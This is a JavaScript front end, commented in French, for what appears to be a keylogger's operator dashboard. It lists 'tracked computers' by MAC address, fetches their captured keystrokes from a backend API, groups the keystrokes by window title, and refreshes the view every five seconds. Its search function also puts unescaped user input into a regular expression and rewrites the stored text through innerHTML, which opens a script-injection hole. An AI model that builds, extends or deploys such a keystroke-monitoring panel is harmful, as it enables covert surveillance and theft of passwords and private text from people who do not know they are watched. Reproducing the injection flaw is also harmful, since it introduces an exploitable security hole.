let logData = {};          // Stocke les frappes triées par fenêtre
let currentWindow = null;  // Stocke la fenêtre sélectionnée
let selectedMac = null;    // Stocke le MAC sélectionné

// (NOUVEAU) Variable globale pour mémoriser la requête de recherche
let currentSearchQuery = "";

document.addEventListener("DOMContentLoaded", function () {
  const computerSelect = document.getElementById("computer-list");
  const logContent = document.getElementById("log-content");
  const windowList = document.createElement("ul");
  const mainMessage = document.getElementById("main-message");
  const recordingStatus = document.getElementById("recordingStatus");

  windowList.classList.add("window-list");
  document.querySelector(".sidebar").appendChild(windowList);

  // =========================
  // 1) Récupère la liste des machines
  // =========================
  async function fetchComputers() {
    try {
      const response = await fetch('/api/get_users');
      const data = await response.json();
      computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

      data.forEach(mac => {
        const option = document.createElement('option');
        option.value = mac;
        option.textContent = mac;
        computerSelect.appendChild(option);
      });
    } catch (error) {
      console.error("Erreur lors de la récupération des machines :", error);
    }
  }

  // =========================
  // 2) Récupère les data d'une machine spécifique
  // =========================
  async function fetchData() {
    selectedMac = computerSelect.value;
    if (!selectedMac) {
      resetView();
      return;
    }

    try {
      const response = await fetch(`/api/get_data/${selectedMac}`);
      const data = await response.json();

      if (data.error) {
        logContent.innerHTML = `<p style="color: red;">${data.error}</p>`;
        return;
      }

      // Réinitialiser les données
      logData = {};

      // Organiser par nom de fenêtre (window_mame)
      data.forEach(entry => {
        const { window_mame } = entry;
        if (!logData[window_mame]) {
          logData[window_mame] = [];
        }
        logData[window_mame].push(entry);
      });

      // Mettre à jour la sidebar
      const newWindows = Object.keys(logData);
      updateWindowsSidebar(newWindows);

      // Si une fenêtre était déjà sélectionnée, on l'affiche
      if (currentWindow && logData[currentWindow]) {
        displayContent(logData[currentWindow]);
      } else {
        // Sinon on affiche toutes les entrées dans l'ordre
        displayContent(data);
      }

      mainMessage.style.display = "none";
      recordingStatus.style.display = "block";

      // (NOUVEAU) - On relance le surlignage avec la query actuelle, s'il y en a une
      if (currentSearchQuery && currentSearchQuery.trim() !== "") {
        searchContent(currentSearchQuery);
      }

    } catch (error) {
      console.error("Erreur lors de la récupération des logs :", error);
    }
  }

  // =========================
  // 3) Vide l'affichage si pas de MAC
  // =========================
  function resetView() {
    logContent.innerHTML = "";
    windowList.innerHTML = "";
    mainMessage.style.display = "block";
    recordingStatus.style.display = "none";
  }

  // =========================
  // 4) Met à jour la liste des fenêtres
  // =========================
  function updateWindowsSidebar(windows) {
    windowList.innerHTML = "";

    if (windows.length === 0) {
      const emptyMessage = document.createElement("li");
      emptyMessage.textContent = "Aucune fenêtre détectée.";
      emptyMessage.style.color = "gray";
      windowList.appendChild(emptyMessage);
      return;
    }

    windows.forEach(windowName => {
      const listItem = document.createElement("li");
      listItem.textContent = windowName;
      listItem.classList.add("window-item");

      // Garde l'état actif si c'est la fenêtre courante
      if (windowName === currentWindow) {
        listItem.classList.add("active");
      }

      listItem.onclick = () => {
        document.querySelectorAll(".window-item").forEach(el => el.classList.remove("active"));
        listItem.classList.add("active");

        currentWindow = windowName;
        displayContent(logData[windowName]);

        // (NOUVEAU) - Réappliquer la recherche si nécessaire
        if (currentSearchQuery && currentSearchQuery.trim() !== "") {
          searchContent(currentSearchQuery);
        }
      };

      windowList.appendChild(listItem);
    });
  }

  // =========================
  // 5) Affiche le contenu dans #log-content
  // =========================
  function displayContent(content) {
    const isScrolledToBottom = logContent.scrollHeight - logContent.clientHeight <= logContent.scrollTop + 10;

    logContent.innerHTML = "";
    let lastWindow = null;
    let lastTimestamp = null;

    content.forEach(entry => {
      const { window_mame, timestamp, data } = entry;

      const dateObj = new Date(timestamp);
      const dateFormatted = dateObj.toLocaleDateString();
      const timeFormatted = dateObj.toLocaleTimeString();
      const fullTimestamp = `${dateFormatted} - ${timeFormatted}`;

      // Si on n'a pas de "fenêtre courante", on regroupe par fenêtre
      if (!currentWindow && window_mame !== lastWindow) {
        const windowTitle = document.createElement("h3");
        windowTitle.textContent = window_mame;
        windowTitle.style.fontWeight = "bold";
        windowTitle.style.marginTop = "10px";
        windowTitle.style.marginBottom = "5px";
        logContent.appendChild(windowTitle);

        lastWindow = window_mame;
        lastTimestamp = dateObj;
        appendTimestamp(fullTimestamp);
      }

      // On affiche le timestamp toutes les 2 minutes
      if (!lastTimestamp || (dateObj - lastTimestamp) >= 120000) {
        appendTimestamp(fullTimestamp);
        lastTimestamp = dateObj;
      }

      const dataElement = document.createElement("p");
      dataElement.textContent = data;  // Le texte brut
      dataElement.style.marginBottom = "5px";
      logContent.appendChild(dataElement);
    });

    // Rester scrollé en bas si on l’était déjà
    if (isScrolledToBottom) {
      logContent.scrollTop = logContent.scrollHeight;
    }
  }

  // Affiche un petit timestamp dans le log
  function appendTimestamp(timestampText) {
    const timeElement = document.createElement("p");
    timeElement.innerHTML = `<strong>${timestampText}</strong>`;
    timeElement.style.fontSize = "11px";
    timeElement.style.fontWeight = "bold";
    timeElement.style.marginBottom = "5px";
    logContent.appendChild(timeElement);
  }

  // =========================
  // 6) Au chargement de la page
  // =========================
  fetchComputers();                 // Récupère la liste des machines
  setInterval(fetchData, 5000);     // Rafraîchit les données toutes les 5s
  computerSelect.addEventListener("change", fetchData);

});

// ============================
// 7) Fonction de recherche & surlignage
// ============================
function searchContent(query) {
  // (NOUVEAU) On stocke la requête actuelle dans la variable globale
  currentSearchQuery = query;

  // Sélectionne le conteneur de logs et tous ses paragraphes
  const logContent = document.getElementById("log-content");
  const paragraphs = logContent.getElementsByTagName("p");

  // Si la recherche est vide, on restaure le texte original
  if (!query) {
    for (let p of paragraphs) {
      if (p.dataset.original) {
        p.innerHTML = p.dataset.original;
      }
    }
    return;
  }

  // Construire une RegExp insensible à la casse
  const regex = new RegExp(`(${query})`, 'gi');

  for (let p of paragraphs) {
    // Premier passage : on enregistre le texte brut
    if (!p.dataset.original) {
      p.dataset.original = p.textContent;
    }

    const originalText = p.dataset.original;
    // Remplacement du terme recherché par <mark>...<mark/>
    const newText = originalText.replace(regex, '<mark>$1</mark>');
    p.innerHTML = newText;
  }
}
